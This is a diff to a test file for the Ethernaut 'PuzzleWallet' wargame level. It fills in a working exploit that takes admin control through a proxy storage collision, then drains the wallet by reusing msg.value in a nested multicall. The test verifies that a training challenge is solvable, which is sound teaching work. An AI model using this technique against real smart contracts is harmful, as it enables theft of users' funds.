@@ -1,7 +1,10 @@
-const PuzzleWalletFactory = artifacts.require('./levels/PuzzleWalletFactory.sol')
-const PuzzleWallet = artifacts.require('./attacks/PuzzleWallet.sol')
+const ethutil = require('ethereumjs-util')
 
+const PuzzleProxy  = artifacts.require('PuzzleProxy');
+const PuzzleWalletFactory = artifacts.require('PuzzleWalletFactory')
+const PuzzleWallet = artifacts.require('PuzzleWallet')
 const Ethernaut = artifacts.require('./Ethernaut.sol')
+
 const { BN, constants, expectEvent, expectRevert } = require('openzeppelin-test-helpers')
 const utils = require('../utils/TestUtils')
 
@@ -31,8 +34,8 @@ contract('PuzzleWallet', function(accounts) {
     // check that PuzzleProxy.pendingAdmin is factory
     assert.equal(owner, await instance.owner())
 
-    // call the PuzzleProxy.proposeNewAdmin(player)
-    // need to use artifact from the proxy (not the wallet)
+    const proxy = await PuzzleProxy.at(instance.address)
+    await proxy.proposeNewAdmin(player)
 
     // check that the player has placed their address in the owner slot
     assert.equal(player, await instance.owner())
@@ -40,19 +43,20 @@ contract('PuzzleWallet', function(accounts) {
     // check that player is not whitelisted yet
     assert.notequal(true, await instance.whitelisted(player))
 
-    // whitelist itself by PuzzleWallet.addToWhitelist(player)
+    // Player whitelists herself
     await instance.addToWhitelist(player, { from: player })
 
-    // deposit 1 eth with PuzzleWallet.deposit{ 1 ether }(1 ether) from player
-    await instance.deposit(web3.utils.toWei('1', 'ether'), {from: player, value: web3.utils.toWei('1', 'ether')})
+    const { data: depositData } = await instance.deposit.request(web3.utils.toWei('1', 'ether'))
+    const { data: nestedMulticallData } = await instance.multicall.request([ depositData ])
+    const { data: executeData } = await instance.execute.request(player, web3.utils.toWei('2', 'ether'), [])
 
-    // build the calldata
-    // call PuzzleWallet.multicall(bytes(2x PuzzleWallet.execute.selector(Proxy.address, 1 ether, "")))
-    const executeSelector = web3.eth.abi.encodeFunctionSignature("execute(address,uint256,bytes)");
-    // call = []
+    const calls = [
+      depositData,
+      nestedMulticallData,
+      executeData,
+    ]
 
-    // call the multicall with the data
-    await instance.multicall(calls)
+    await instance.multicall(calls, { from: player, value: web3.utils.toWei('1', 'ether')})
 
     // check that PuzzleWallet.balance == zero
     assert.isZero(await web3.eth.getBalance(instance))
